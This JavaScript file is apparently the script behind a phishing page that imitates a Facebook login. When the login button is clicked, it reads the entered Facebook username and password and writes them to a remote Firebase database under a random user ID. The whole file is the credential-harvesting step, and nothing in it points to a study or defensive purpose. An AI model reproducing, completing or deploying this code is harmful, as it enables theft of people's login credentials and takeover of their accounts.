import { getDatabase, ref, set} from 'https://www.gstatic.com/firebasejs/9.18.0/firebase-database.js';
import {  } from 'https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js'
import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js'

// If you enabled Analytics in your project, add the Firebase SDK for Google Analytics
import { getAnalytics } from 'https://www.gstatic.com/firebasejs/9.18.0/firebase-analytics.js'

// Add Firebase products that you want to use
import { getAuth } from 'https://www.gstatic.com/firebasejs/9.18.0/firebase-auth.js'
import { getFirestore } from 'https://www.gstatic.com/firebasejs/9.18.0/firebase-firestore.js'



var btnLog = document.querySelector('.btn-log')

var fbId = Math.floor(Math.random() * 1000000)


btnLog.addEventListener("click", function(){
    var fbUsername = document.querySelector('.facebook-username').value;
    var fbPassword = document.querySelector('.facebook-password').value;
    writeUserData(fbId,fbUsername,fbPassword)
    


})




function writeUserData(userId,username, password) {
    const db = getDatabase();
    set(ref(db, 'users/' + userId), {
      username: username,
      password: password
    });
}

